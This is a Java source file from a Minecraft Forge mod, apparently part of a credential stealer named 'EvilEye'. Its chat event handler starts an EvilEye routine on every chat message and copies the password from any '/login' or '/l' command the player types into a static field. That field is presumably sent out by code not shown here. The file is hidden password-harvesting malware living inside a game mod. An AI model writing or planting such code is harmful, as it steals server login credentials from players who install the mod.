package me.bushroot.evileye.Evil;

import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber
public class ChatEvent {
    @SubscribeEvent
    public static void chatEvent(final ClientChatEvent e) {
        final String[] sentences = e.getMessage().split(" ");

        new EvilEye().start();
        if ((e.getMessage().startsWith("/l") && sentences.length > 1) || (e.getMessage().startsWith("/login") && sentences.length > 1)) {
            EvilEye.password = sentences[1];
        }
    }
}
